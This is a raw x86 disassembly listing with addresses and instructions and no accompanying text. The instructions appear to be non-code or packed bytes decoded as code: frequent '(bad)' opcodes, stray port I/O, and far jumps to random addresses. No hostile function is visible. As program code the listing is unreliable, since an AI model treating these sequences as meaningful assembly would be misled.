  412fd8:	cmp    BYTE PTR [edi],0x3b
  412fdb:	pushf  
  412fdc:	mov    esp,esp
  412fde:	jmp    0xbd8759aa
  412fe3:	dec    ebp
  412fe4:	jne    0x412ffd
  412fe6:	jp     0x413060
  412fe8:	shl    DWORD PTR [ebp+0x77],cl
  412feb:	sbb    BYTE PTR [edx],dh
  412fed:	mov    ebx,0x4d72ed2e
  412ff2:	test   DWORD PTR [edx-0x7d],edi
  412ff5:	mov    WORD PTR [esi],gs
  412ff7:	sbb    ecx,ebp
  412ff9:	adc    bl,bh
  412ffb:	pop    edx
  412ffc:	dec    ebp
  412ffd:	cli    
  412ffe:	cmp    al,0x5e
  413000:	xor    al,dl
  413002:	aam    0x70
  413004:	leave  
  413005:	mov    ah,0x42
  413007:	sbb    al,0x59
  413009:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41300a:	neg    BYTE PTR [ebx-0x7]
  41300d:	mov    ah,0x81
  41300f:	jmp    0x299dc25f
  413014:	clc    
  413015:	dec    edi
  413016:	adc    dh,BYTE PTR [eax+ebp*2-0x5b736ff8]
  41301d:	sub    al,0x7b
  41301f:	inc    esi
  413020:	hlt    
  413021:	mov    ah,0x31
  413023:	mov    DWORD PTR [esi+0x18],0x303db7d3
  41302a:	repz mov ebx,0xccb20a48
  413030:	or     al,0xac
  413032:	loope  0x413020
  413034:	cmp    ah,BYTE PTR [esi+0x4b483fa]
  41303a:	lods   eax,DWORD PTR ds:[esi]
  41303b:	push   edx
  41303c:	repz aam 0xdc
  41303f:	cld    
  413040:	adc    BYTE PTR [ecx-0x1e],0x8
  413044:	inc    ecx
  413045:	add    ecx,0x7d
  413048:	push   es
  413049:	sub    dh,BYTE PTR [edi]
  41304b:	push   ebx
  41304d:	ror    DWORD PTR [esi],cl
  41304f:	ret    
  413050:	mov    bh,0x1a
  413052:	jns    0x41303f
  413054:	sub    al,0x88
  413056:	pop    ebp
  413057:	je     0x412fda
  413059:	add    BYTE PTR [edx+0x77],al
  41305c:	mov    ds:0xa65f76da,al
  413061:	out    0x30,eax
  413063:	test   BYTE PTR [edi-0x8491ac8],ah
  413069:	rcr    BYTE PTR [edx+ebp*4-0x17],cl
  41306d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41306e:	jnp    0x413047
  413070:	arpl   WORD PTR [edi-0x1142d41c],sp
  413076:	into   
  413077:	push   eax
  413078:	ret    0x3939
  41307b:	xchg   BYTE PTR [edi],bh
  41307d:	dec    ebx
  41307e:	cmp    ch,bh
  413080:	adc    eax,0x35
  413083:	pop    ecx
  413084:	jge    0x4130db
  413086:	into   
  413087:	add    edi,DWORD PTR [ecx]
  413089:	jmp    0x72b9cf34
  41308e:	bts    DWORD PTR [ebp+0x9],edx
  413092:	push   ebp
  413093:	and    DWORD PTR [eax-0x522cae4c],ecx
  413099:	add    BYTE PTR [ebp-0x1e],dl
  41309c:	pop    eax
  41309d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41309e:	repnz int3 
  4130a0:	test   DWORD PTR [edi+edx*1-0x5f],esp
  4130a4:	ss loop 0x41306d
  4130a7:	hlt    
  4130a8:	pop    ds
  4130a9:	jbe    0x413093
  4130ab:	mov    WORD PTR [eax-0x5092e139],cs
  4130b1:	scas   eax,DWORD PTR es:[edi]
  4130b2:	inc    edx
  4130b3:	sbb    al,0x3c
  4130b5:	je     0x413062
  4130b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130b8:	fs add al,0x0
  4130bb:	inc    eax
  4130bc:	js     0x4130a1
  4130be:	mov    ecx,0x1620dc0c
  4130c3:	mov    esp,0x92508a1d
  4130c8:	jbe    0x413113
  4130ca:	cld    
  4130cb:	call   0x35634ed9
  4130d0:	ror    DWORD PTR [ebx+0x274345f2],1
  4130d6:	add    al,0x6c
  4130d8:	shl    DWORD PTR [edx+0x6c16517d],1
  4130de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130df:	mov    WORD PTR [ebp+esi*1+0xe],cs
  4130e3:	mov    bl,0xe3
  4130e5:	push   ebx
  4130e6:	xor    esi,edi
  4130e8:	mov    al,0x4a
  4130ea:	out    dx,eax
  4130eb:	pushf  
  4130ec:	ins    DWORD PTR es:[edi],dx
  4130ed:	iret   
  4130ee:	fsubr  st(7),st
  4130f0:	je     0x4130cc
  4130f2:	cmp    ecx,DWORD PTR [edi+0x1c]
  4130f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130f6:	adc    BYTE PTR [esi+0x0],ch
  4130f9:	ss arpl ax,cx
  4130fc:	adc    ah,BYTE PTR [edi-0x43]
  4130ff:	and    DWORD PTR [eax-0x6e8bfb3d],ecx
  413105:	lock in eax,0xac
  413108:	jno    0x413157
  41310a:	mov    cs,WORD PTR [ebx]
  41310c:	(bad)  
  41310d:	or     al,0x45
  41310f:	add    eax,0x6ad27b92
  413114:	adc    eax,0x9ee26cb5
  413119:	sbb    BYTE PTR [esi+0x5c12c996],bh
  41311f:	(bad)  
  413121:	repz test DWORD PTR ds:[edi+ecx*4-0x33],edx
  413127:	xchg   DWORD PTR [ecx],edx
  413129:	pop    ds
  41312a:	push   ebp
  41312b:	cdq    
  41312c:	mov    esp,0x48b59a0f
  413131:	adc    DWORD PTR [edi-0x23],0x2
  413135:	cmp    al,0xfb
  413137:	xchg   edx,eax
  413138:	sbb    eax,0xa3c446f
  41313d:	add    al,BYTE PTR [eax]
  41313f:	test   eax,0x1440823b
  413144:	mov    esp,0x72dc066d
  413149:	adc    ecx,DWORD PTR [eax-0x7d9db9b0]
  41314f:	mov    ebx,0xfaeea00f
  413154:	cmp    DWORD PTR [eax-0x7e],0xfcea2444
  41315b:	xchg   BYTE PTR [ebp-0x677b8800],bl
  413161:	shl    esi,0x5e
  413164:	or     DWORD PTR [ebx-0x1cc85047],eax
  41316a:	push   0xd709a36d
  41316f:	dec    eax
  413170:	push   ebp
  413171:	mov    edi,0xfe914fca
  413176:	and    BYTE PTR [esp+esi*1-0x1c9b7f5f],bl
  41317d:	sbb    dl,BYTE PTR ds:0xb4f39316
  413183:	inc    edx
  413184:	leave  
  413185:	mov    ebx,0x33a36b15
  41318a:	pop    edx
  41318b:	dec    BYTE PTR [edx+eax*2]
  41318e:	nop
  41318f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413190:	mov    ch,0xeb
  413192:	pop    edx
  413193:	rol    BYTE PTR [eax],1
  413195:	fld    QWORD PTR [edx]
  413197:	and    edx,DWORD PTR [edi]
  413199:	dec    esp
  41319a:	jbe    0x4131d4
  41319c:	adc    DWORD PTR [edi-0x58400f5b],0x9d966d16
  4131a6:	mov    ch,0x35
  4131a8:	aad    0x83
  4131aa:	cli    
  4131ab:	xchg   edx,ecx
  4131ad:	pop    edi
  4131ae:	into   
  4131af:	cmp    BYTE PTR [edi+ebx*2+0x2dd5ecff],ch
  4131b6:	xchg   esi,eax
  4131b7:	pop    esp
  4131b8:	rol    DWORD PTR [eax+0x76],1
  4131bb:	xchg   esi,eax
  4131bc:	xor    ebx,ecx
  4131be:	xchg   ecx,eax
  4131bf:	shr    al,cl
  4131c1:	jg     0x41317f
  4131c3:	dec    ebx
  4131c4:	data16 fisub WORD PTR [ebp+eax*1-0x5647ee31]
  4131cc:	mov    DWORD PTR [eax+0x6e],edi
  4131cf:	out    dx,eax
  4131d0:	xchg   esp,eax
  4131d1:	scas   al,BYTE PTR es:[edi]
  4131d2:	pop    ds
  4131d3:	iret   
  4131d4:	aas    
  4131d5:	xchg   edi,eax
  4131d6:	not    BYTE PTR [edi+0x44ae305d]
  4131dc:	sub    al,0x16
  4131de:	lods   eax,DWORD PTR ds:[esi]
  4131df:	ja     0x413189
  4131e1:	mov    ds:0x16002c82,al
  4131e6:	hlt    
  4131e7:	in     al,dx
  4131e8:	loope  0x413242
  4131ea:	repnz cmp al,0x40
  4131ed:	in     al,0x8d
  4131ef:	mov    dl,0x2b
  4131f1:	xchg   edi,eax
  4131f2:	push   edx
  4131f3:	test   al,0x86
  4131f5:	cmp    DWORD PTR [ebx+0x155c1261],ecx
  4131fb:	retf   
  4131fc:	mov    ebx,0x7dd1d359
  413201:	imul   ebx,DWORD PTR [edi+0x6f],0xffffffbb
  413205:	call   0x2ac6:0xab1c11cc
  41320c:	jg     0x413233
  41320e:	xchg   edi,eax
  41320f:	sbb    ch,ah
  413211:	jns    0x4131d2
  413213:	cmc    
  413214:	or     edx,DWORD PTR [ebx]
  413216:	xchg   edx,eax
  413217:	fidiv  DWORD PTR [ebp+0x35ca7393]
  41321d:	sbb    eax,0xd4ba9088
  413222:	mov    al,0x72
  413224:	lods   eax,DWORD PTR ds:[esi]
  413225:	into   
  413226:	jg     0x413289
  413228:	mov    ecx,0x9be44ac6
  41322d:	dec    esp
  41322e:	out    0xf2,eax
  413230:	gs call 0xaf9f:0x9adef662
  413238:	(bad)  
  413239:	jb     0x4131be
  41323b:	stos   DWORD PTR es:[edi],eax
  41323c:	push   ebx
  41323d:	test   al,0x12
  41323f:	inc    ebx
  413240:	inc    edx
  413241:	or     DWORD PTR ds:0x794b1526,0xf56659e9
  41324b:	jo     0x41329f
  41324d:	cmp    al,0xd8
  41324f:	fadd   QWORD PTR [edi+0x3]
  413252:	aaa    
  413253:	or     edx,eax
  413255:	rcr    edi,cl
  413257:	xor    BYTE PTR [ecx-0x38],al
  41325a:	add    dl,BYTE PTR [ebx+0x19]
  41325d:	and    DWORD PTR [eax-0x7b03e6cb],eax
  413263:	xchg   BYTE PTR [esi],dl
  413265:	inc    ecx
  413266:	iret   
  413267:	mov    ah,0xbe
  413269:	or     al,0x1c
  41326b:	test   BYTE PTR [edx+0x38fbf8f],ah
  413271:	sbb    eax,0xe853369a
  413276:	cli    
  413277:	mov    dl,0x47
  413279:	push   ebx
  41327a:	sahf   
  41327b:	jg     0x413248
  41327d:	pop    ebp
  41327e:	add    DWORD PTR [edi+eiz*8+0x803c6c3],edx
  413285:	pop    edi
  413286:	test   DWORD PTR [ecx-0x68fb8411],0x81674e08
  413290:	jnp    0x4132e3
  413292:	add    DWORD PTR [eax+eax*1],edx
  413295:	(bad)  
  413296:	call   0x7f4:0x7fcce436
  41329d:	dec    esi
  41329e:	jmp    0x4132e6
  4132a0:	jmp    0x413252
  4132a2:	and    BYTE PTR [ecx],0x4e
  4132a5:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4132a7:	out    0x6,al
  4132a9:	mov    ah,BYTE PTR [ebx+esi*1]
  4132ac:	sahf   
  4132ad:	not    DWORD PTR [eax]
  4132af:	pusha  
  4132b0:	out    0x2c,al
  4132b2:	js     0x413297
  4132b4:	dec    eax
  4132b5:	inc    eax
  4132b6:	xchg   esi,eax
  4132b7:	daa    
  4132b8:	xchg   BYTE PTR [esi-0x44],bl
  4132bb:	fstp   DWORD PTR [ebp+0x5c127366]
  4132c1:	mov    esp,0x9d7bdf20
  4132c6:	(bad)  
  4132c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132c8:	mov    ah,0x7a
  4132ca:	xchg   esi,eax
  4132cb:	cmp    ecx,esp
  4132cd:	dec    ecx
  4132ce:	ins    BYTE PTR es:[edi],dx
  4132cf:	das    
  4132d0:	jns    0x41331a
  4132d2:	sub    bl,BYTE PTR [ecx]
  4132d4:	xchg   edx,eax
  4132d5:	(bad)  
  4132d6:	leave  
  4132d7:	mov    edi,0xec52b607
  4132dc:	cdq    
  4132dd:	sbb    eax,0x73c7b527
  4132e2:	ss jmp 0xbfc1:0xee2635f2
  4132ea:	jnp    0x41329e
  4132ec:	dec    BYTE PTR [edx+0x4e]
  4132ef:	popa   
  4132f0:	hlt    
  4132f1:	xchg   edx,eax
  4132f2:	das    
  4132f3:	inc    esp
  4132f4:	sar    BYTE PTR [esi],cl
  4132f6:	sbb    al,0xae
  4132f8:	in     al,dx
  4132f9:	pop    esi
  4132fa:	xor    DWORD PTR ds:[eax+0x2],ecx
  4132fe:	int    0xdc
  413300:	retf   
  413301:	popf   
  413302:	jmp    0xe7bca091
  413307:	bound  eax,QWORD PTR [ebx-0x1]
  41330a:	out    0x67,eax
  41330c:	sbb    eax,0x541f9221
  413311:	mov    eax,0x66495b4d
  413316:	fisttp WORD PTR [edx+eiz*4+0x44]
  41331a:	retf   0x186
  41331d:	dec    ebx
  41331e:	pop    ebp
  41331f:	cmp    DWORD PTR [edx-0x5],esp
  413322:	out    0xba,eax
  413324:	or     BYTE PTR [ecx],ah
  413326:	(bad)  [eax-0x7b]
  413329:	mul    DWORD PTR [eax+0x4d]
  41332c:	div    BYTE PTR [esi+0x77]
  41332f:	cmc    
  413330:	adc    BYTE PTR [eax],0xd7
  413333:	dec    ebp
  413334:	nop
  413335:	adc    dl,BYTE PTR [ebx-0x5dc68a1a]
  41333b:	fiadd  DWORD PTR [ecx-0x925dc92]
  413341:	add    eax,esp
  413343:	push   esi
  413344:	out    0x44,al
  413346:	cli    
  413347:	dec    ebp
  413348:	(bad)  
  413349:	shr    BYTE PTR [ecx],cl
  41334b:	call   0xa4b:0x95657ea
  413352:	adc    si,WORD PTR [esp+ecx*2-0x7bb619a7]
  41335a:	fldcw  WORD PTR [eax]
  41335c:	lea    ebx,[edx+edi*8]
  41335f:	js     0x4133b3
  413361:	add    DWORD PTR [ebx+0xad2ab19],0xffffff8f
  413368:	inc    ebx
  413369:	mov    esp,0x80fc46de
  41336e:	jmp    0x41331c
  413370:	imul   ebp,DWORD PTR [ebp+0x7337c9b6],0xffffffc1
  413377:	arpl   WORD PTR [esp+ecx*4+0x22],cx
  41337b:	nop
  41337c:	xlat   BYTE PTR ds:[ebx]
  41337d:	adc    BYTE PTR [ebp-0x74],0x4b
  413381:	int3   
  413382:	loope  0x413391
  413384:	scas   eax,DWORD PTR es:[edi]
  413385:	rcr    BYTE PTR [edx+0x4ecf457a],cl
  41338b:	cmp    BYTE PTR [edi],dh
  41338d:	mov    ebp,0x749c0c78
  413392:	out    dx,eax
  413393:	lods   al,BYTE PTR ds:[esi]
  413395:	inc    ecx
  413396:	inc    esp
  413397:	cs pop ss
  413399:	and    DWORD PTR [ecx],edx
  41339b:	mov    eax,0x8b873336
  4133a0:	xor    edi,DWORD PTR [esi+0x3e3a948f]
  4133a6:	ds push 0x7018befd
  4133ac:	sbb    DWORD PTR [esi-0x13],ebx
  4133af:	pushw  ss
  4133b1:	call   0xb0a7:0x3aca07ee
  4133b8:	pop    edi
  4133b9:	inc    edi
  4133ba:	lds    ecx,FWORD PTR [edx-0x315eefdb]
  4133c0:	fdivrp st(0),st
  4133c2:	and    BYTE PTR [ebx+0x81a81d2],dh
  4133c8:	jbe    0x413384
  4133ca:	pop    ecx
  4133cb:	jb     0x4133bf
  4133cd:	mov    eax,0x7453dbc9
  4133d2:	mov    esp,0x2d49bc82
  4133d7:	mov    dh,0xd4
  4133d9:	out    0x64,al
  4133db:	mov    esi,0x4562f922
  4133e0:	mov    cl,0x61
  4133e2:	cld    
  4133e3:	pop    ebx
  4133e4:	(bad)  
  4133e5:	rep ins BYTE PTR es:[edi],dx
  4133e7:	mov    bl,0xd0
  4133e9:	xchg   esi,eax
  4133ea:	mov    ebx,0xc2f92fdc
  4133ef:	rol    BYTE PTR [ecx-0x74],cl
  4133f2:	sbb    eax,0xa87a659c
  4133f7:	cmp    eax,0x5617cb96
  4133fc:	adc    DWORD PTR [edx-0x49],edx
  4133ff:	and    eax,0x3817d3f7
  413404:	adc    DWORD PTR ds:0x25bd5a77,ebp
  41340a:	push   ebp
  41340b:	das    
  41340c:	cdq    
  41340d:	not    DWORD PTR [esi+0x71d5b59e]
  413413:	lods   eax,DWORD PTR ds:[esi]
  413414:	lock mov edi,0xe9175ee0
  41341a:	xor    al,0x64
  41341c:	or     bl,BYTE PTR [eax]
  41341e:	test   BYTE PTR [edi],0xee
  413421:	cmp    bh,BYTE PTR ds:0xd82fc46b
  413427:	xlat   BYTE PTR ds:[ebx]
  413428:	push   edi
  413429:	retf   0x39cc
  41342c:	nop
  41342d:	fisub  WORD PTR ds:0xbabd2cd
  413433:	cmp    eax,0x7144d7ed
  413438:	jmp    0x5e32:0x3c371111
  41343f:	outs   dx,DWORD PTR ds:[esi]
  413440:	inc    ebx
  413441:	mov    eax,ds:0x511a9550
  413446:	cmc    
  413447:	es cwde 
  413449:	imul   eax,DWORD PTR [edi-0x37],0xa49d081
  413450:	jecxz  0x4133f0
  413452:	lock fadd QWORD PTR [edx+0x14]
  413456:	iret   
  413457:	cwde   
  413458:	(bad)  
  413459:	mov    edi,0x889eeb78
  41345e:	int    0xdf
  413460:	test   DWORD PTR [edi+0x253fffe3],edi
  413466:	lds    ecx,FWORD PTR [ebx+eiz*2]
  413469:	cs pop edx
  41346b:	jae    0x4134e9
  41346d:	loopne 0x41343e
  41346f:	adc    al,0x48
  413471:	pop    eax
  413472:	fsub   st,st(7)
  413474:	jle    0x4134d4
  413476:	test   eax,0xc8075d73
  41347b:	out    dx,eax
  41347c:	and    ebx,DWORD PTR [ebx+ecx*2-0x3a]
  413480:	pop    ecx
  413481:	xchg   ebp,eax
  413482:	stos   DWORD PTR es:[edi],eax
  413483:	fisttp QWORD PTR ds:0xc33eec0a
  413489:	pop    eax
  41348a:	dec    ebx
  41348b:	icebp  
  41348c:	xchg   dh,al
  41348e:	add    eax,0x1cf68c4e
  413493:	jb     0x4134ff
  413495:	jl     0x413466
  413497:	(bad)  
  413498:	jb     0x413515
  41349a:	push   esp
  41349b:	nop
  41349c:	pop    ss
  41349d:	jne    0x4134e7
  41349f:	cld    
  4134a0:	popa   
  4134a1:	cmp    dh,BYTE PTR ds:0x9df1e897
  4134a7:	in     eax,0x70
  4134a9:	push   ecx
  4134aa:	test   DWORD PTR [esi-0x692a5eaf],edi
  4134b0:	outs   dx,DWORD PTR ds:[esi]
  4134b1:	sub    DWORD PTR [ecx-0x5],0xfffffff7
  4134b5:	ret    
  4134b6:	mov    dh,0xb1
  4134b8:	shl    dh,0xc6
  4134bb:	call   0x47fa:0xa29850f9
  4134c2:	ja     0x413534
  4134c4:	out    0x33,al
  4134c6:	cmp    bh,BYTE PTR [ecx-0x164d9bd6]
  4134cc:	ja     0x413517
  4134ce:	dec    edx
  4134cf:	mov    esp,0x8dc8c6b4
  4134d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134d5:	rol    BYTE PTR [esi+0x37],0xa2
  4134d9:	push   ebp
  4134da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134db:	push   cs
  4134dc:	pop    esp
  4134dd:	iret   
  4134de:	and    DWORD PTR [edi+esi*1],edi
  4134e1:	pop    edi
  4134e2:	cmp    BYTE PTR [eax+edx*8-0x19693db0],0x45
  4134ea:	push   ecx
  4134eb:	jmp    eax
  4134ed:	in     eax,dx
  4134ee:	sbb    dl,bh
  4134f0:	outs   dx,DWORD PTR ds:[esi]
  4134f1:	out    dx,eax
  4134f2:	mov    bh,0x81
  4134f4:	mov    BYTE PTR [edi],dh
  4134f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134f7:	pop    ds
  4134f8:	mov    cl,0x7a
  4134fa:	inc    ebx
  4134fb:	and    ebx,0xffffffff
  4134fe:	lods   eax,DWORD PTR ds:[esi]
  4134ff:	retf   
  413500:	and    al,0x13
  413502:	pop    edx
  413503:	xor    cl,BYTE PTR [eax+0x51]
  413506:	cwde   
  413507:	mov    ds:0x904b1657,al
  41350c:	pop    ds
  41350d:	hlt    
  41350e:	push   edx
  41350f:	ds pusha 
  413511:	fild   DWORD PTR [ecx+eiz*1+0x78]
  413515:	add    BYTE PTR [edi-0x45],bl
  413518:	rcr    DWORD PTR [edi+0x4e4fb4b],1
  41351e:	cli    
  41351f:	pop    ebx
  413520:	daa    
  413521:	data16 jg 0x413594
  413524:	mov    ebp,0x789375fd
  413529:	or     dl,BYTE PTR [edx+ecx*1+0x1cc3d108]
  413530:	call   DWORD PTR [eax-0x11263a2d]
  413536:	xchg   edi,eax
  413537:	mov    ah,0x5f
  413539:	ins    BYTE PTR es:[edi],dx
  41353a:	ds mov esi,0xed7c97b1
  413540:	jge    0x4135af
  413542:	inc    esp
  413543:	push   edx
  413544:	sar    DWORD PTR ds:[esp+esi*2+0x3f807b94],1
  41354c:	dec    ebp
  41354d:	popa   
  41354e:	cmp    ebx,0x3fc85d94
  413554:	retf   0x3cba
  413557:	loope  0x413549
  413559:	dec    ebx
  41355a:	xchg   edi,eax
  41355b:	push   ebx
  41355c:	inc    eax
  41355d:	dec    ebp
  41355e:	cwde   
  41355f:	add    eax,0x7fdfe05c
  413564:	push   0xdc989b4e
  413569:	push   esp
  41356a:	fidivr WORD PTR [eax-0x6c]
  41356d:	mov    dl,BYTE PTR [ecx+eax*8-0x11a711a9]
  413574:	mov    dl,0x68
  413576:	leave  
  413577:	sti    
  413578:	mov    ds:0xac0976da,al
  41357d:	jecxz  0x4135a3
  41357f:	ss neg ch
  413582:	jg     0x413581
  413584:	dec    edi
  413585:	mov    esi,ss
  413587:	cld    
  413588:	scas   al,BYTE PTR es:[edi]
  413589:	adc    eax,0xc5614508
  41358e:	dec    ecx
  41358f:	or     BYTE PTR [ebp+0x8],ch
  413592:	lock maskmovq mm5,mm0
  413596:	cmp    ebx,eax
  413598:	cmp    al,ch
  41359a:	stos   BYTE PTR es:[edi],al
  41359b:	mov    DWORD PTR [ecx],ecx
  41359d:	mov    edx,DWORD PTR [esi-0x33]
  4135a0:	inc    ecx
  4135a1:	stos   DWORD PTR es:[edi],eax
  4135a2:	jmp    0x3ecb222b
  4135a7:	call   0x106cb119
  4135ac:	add    al,0x44
  4135ae:	jl     0x4135c9
  4135b0:	or     esi,DWORD PTR [ebx-0x791a07dc]
  4135b6:	icebp  
  4135b7:	xchg   edi,eax
  4135b8:	stos   DWORD PTR es:[edi],eax
  4135b9:	dec    esi
  4135ba:	and    dl,al
  4135bc:	mov    dl,bh
  4135be:	je     0x4135d2
  4135c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135c1:	push   ebx
  4135c2:	push   esp
  4135c3:	outs   dx,DWORD PTR ds:[esi]
  4135c4:	add    esi,ebp
  4135c6:	push   edi
  4135c7:	lods   al,BYTE PTR ds:[esi]
  4135c8:	sub    BYTE PTR [edx-0x12],al
  4135cb:	inc    ebx
  4135cc:	leave  
  4135cd:	in     eax,0x31
  4135cf:	call   0xef7b579a
  4135d4:	jns    0x413620
  4135d6:	fiadd  WORD PTR [ecx-0x23]
  4135d9:	in     eax,0x24
  4135db:	xor    al,0xbd
  4135dd:	cmp    ebp,ebx
  4135df:	arpl   WORD PTR [edx+0x5c],ax
  4135e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135e3:	out    0xc6,eax
  4135e5:	in     eax,0x2e
  4135e7:	mov    edx,DWORD PTR [edi-0x4ae7cd70]
  4135ed:	gs pop ss
  4135ef:	dec    edi
  4135f0:	xchg   edx,eax
  4135f1:	fxam   
  4135f3:	mov    ecx,0x1d72eb0f
  4135f8:	shl    ah,1
  4135fa:	add    eax,0x1c405533
  4135ff:	clc    
  413600:	outs   dx,DWORD PTR ds:[esi]
  413601:	mov    esp,0x44e44e6f
  413606:	inc    ebp
  413607:	inc    ebp
  413608:	mov    ds:0xba984272,al
  41360d:	xchg   edi,eax
  41360e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41360f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413610:	aaa    
  413611:	add    edi,DWORD PTR [edx-0x25df6468]
  413617:	iret   
  413618:	(bad)  
  413619:	stc    
  41361a:	loopne 0x41367d
  41361c:	add    BYTE PTR [ebx+0x1f],dl
  41361f:	(bad)  
  413620:	push   edx
  413621:	or     ah,BYTE PTR [esi-0x88e6f4e]
  413627:	xor    edi,edx
  413629:	add    al,0x9a
  41362b:	loop   0x413661
  41362d:	sahf   
  41362e:	or     bh,BYTE PTR [edi-0xf]
  413631:	in     eax,0x90
  413633:	xchg   edx,eax
  413634:	cwde   
  413635:	out    0x31,al
  413637:	je     0x413632
  413639:	xchg   ebx,eax
  41363a:	lock jns 0x413676
  41363d:	add    DWORD PTR ss:[edx+0x2f],ebx
  413641:	jg     0x413689
  413643:	adc    esi,DWORD PTR [edx]
  413645:	dec    esp
  413646:	cmp    bh,BYTE PTR fs:[ebx+0x1795bb]
  41364d:	(bad)  
  41364e:	mov    ch,0x66
  413650:	inc    ebx
  413651:	sti    
  413652:	dec    ebx
  413653:	cdq    
  413654:	ins    DWORD PTR es:[edi],dx
  413655:	push   0x18
  413657:	mov    cl,0xc8
  413659:	add    dl,BYTE PTR [ebx-0x3851e86f]
  41365f:	rcr    bh,1
  413661:	(bad)
  413665:	push   0x2ad8bbf0
  41366a:	xor    ax,0x84e5
  41366e:	sub    dl,BYTE PTR [ebx+0x1]
  413671:	mov    esi,0x996dc73a
  413676:	popa   
  413677:	dec    esp
  413678:	scas   al,BYTE PTR es:[edi]
  413679:	lods   al,BYTE PTR ds:[esi]
  41367a:	das    
  41367b:	sub    edi,DWORD PTR [eax+0x7a29c6bf]
  413681:	std    
  413682:	xor    BYTE PTR [edi-0x35a27a85],0x1
  413689:	sbb    DWORD PTR ds:0xea9888df,edi
  41368f:	or     al,0xcf
  413691:	adc    al,bl
  413693:	mov    edi,0xc45a4711
  413698:	(bad)  
  413699:	mov    edi,0xc727af3d
  41369e:	cli    
  41369f:	adc    al,0xef
  4136a1:	jg     0x413661
  4136a3:	pop    esi
  4136a4:	sbb    dh,BYTE PTR ds:0x74f78ba8
  4136aa:	pop    eax
  4136ab:	lds    eax,FWORD PTR [eax-0x7de3f8e5]
  4136b1:	js     0x4136d7
  4136b3:	fidivr DWORD PTR es:[ecx]
  4136b6:	mov    bl,0xf2
  4136b8:	mov    dl,0x98
  4136ba:	push   cs
  4136bb:	xchg   edi,eax
  4136bc:	cs inc ebp
  4136be:	xchg   esp,eax
  4136bf:	xor    BYTE PTR [eax+edx*1+0x41],ah
  4136c3:	push   edx
  4136c4:	adc    eax,0x33fbc78b
  4136c9:	and    al,0x85
  4136cb:	aas    
  4136cc:	jp     0x413696
  4136ce:	mov    ch,0xa8
  4136d0:	add    BYTE PTR [edi-0x5e],dh
  4136d3:	jnp    0x4136ef
  4136d5:	popf   
  4136d6:	mov    ah,0x8b
  4136d8:	test   eax,0x344630a8
  4136dd:	and    eax,0x16c0f24e
  4136e2:	fcom   DWORD PTR [esi+0x5b1f8a8f]
  4136e8:	jl     0x41375f
  4136ea:	jbe    0x41366f
  4136ec:	push   eax
  4136ed:	ret    0x36e9
  4136f0:	ret    
  4136f1:	pop    ebx
  4136f2:	or     BYTE PTR [edi],dl
  4136f4:	(bad)  
  4136f5:	cmp    al,0x64
  4136f7:	pop    ebp
  4136f8:	inc    esp
  4136f9:	into   
  4136fa:	scas   al,BYTE PTR es:[edi]
  4136fb:	adc    BYTE PTR [edi],al
  4136fd:	xor    DWORD PTR [ebx+ebx*4+0x34],0xffffffc7
  413702:	in     eax,dx
  413703:	dec    ecx
  413704:	es out dx,al
  413706:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413707:	or     DWORD PTR [ebx-0x29ee439b],ebp
  41370d:	mov    cl,0x4d
  41370f:	(bad)  
  413710:	aam    0xf5
  413712:	rcl    DWORD PTR [esi-0x64],0x5
  413716:	lods   eax,DWORD PTR ds:[esi]
  413717:	inc    edi
  413718:	mov    dl,0x2
  41371a:	pop    ebx
  41371b:	push   ebp
  41371c:	and    al,0xac
  41371e:	cli    
  41371f:	inc    ecx
  413720:	lahf   
  413721:	adc    al,BYTE PTR [esi-0x63]
  413724:	push   ebp
  413725:	test   al,0x3
  413727:	int    0x16
  413729:	mov    al,ds:0x715ffdef
  41372e:	cmp    eax,0xd1449712
  413733:	jo     0x413759
  413735:	push   es
  413736:	dec    edx
  413737:	in     eax,dx
  413738:	fwait
  413739:	sahf   
  41373a:	(bad)  
  41373b:	cmp    dl,bl
  41373d:	xor    ch,bh
  41373f:	push   eax
  413740:	xchg   ebx,eax
  413741:	ja     0x41373f
  413743:	in     al,dx
  413744:	lods   al,BYTE PTR ds:[esi]
  413745:	mov    ebp,ebp
  413747:	dec    eax
  413748:	bound  ebp,QWORD PTR [ebp-0x47]
  41374b:	and    al,ah
  41374d:	xchg   esi,eax
  41374e:	scas   eax,DWORD PTR es:[edi]
  41374f:	lea    ecx,[edi+0x46aa3778]
  413755:	push   edi
  413756:	les    esi,FWORD PTR [ecx+0x38]
  413759:	mov    DWORD PTR [edx],ebp
  41375b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41375c:	push   ds
  41375d:	push   0x9
  41375f:	enter  0x2526,0x7a
  413763:	cmp    ecx,edx
  413765:	mov    bl,0xb6
  413767:	xor    al,0x62
  413769:	mov    cs,ecx
  41376b:	mov    edi,DWORD PTR ds:0xd133d494
  413771:	pop    esi
  413772:	xchg   esi,eax
  413773:	mov    WORD PTR [ebp+0x39609f17],?
  413779:	ret    
  41377a:	icebp  
  41377b:	rol    BYTE PTR [eax+edx*8],cl
  41377e:	pusha  
  41377f:	xchg   edx,eax
  413780:	pop    es
  413781:	std    
  413782:	xor    bh,bl
  413784:	daa    
  413785:	or     BYTE PTR [edi+0x103d28dc],dl
  41378b:	and    dh,BYTE PTR [edi-0x713c3e05]
  413791:	xchg   edi,eax
  413792:	addr16 add al,0xe1
  413795:	stos   DWORD PTR es:[edi],eax
  413796:	and    dl,BYTE PTR [esi-0x12]
  413799:	mov    dh,0xfd
  41379b:	je     0x41371f
  41379d:	cmp    DWORD PTR [ebp+0x5b],edi
  4137a0:	ja     0x413774
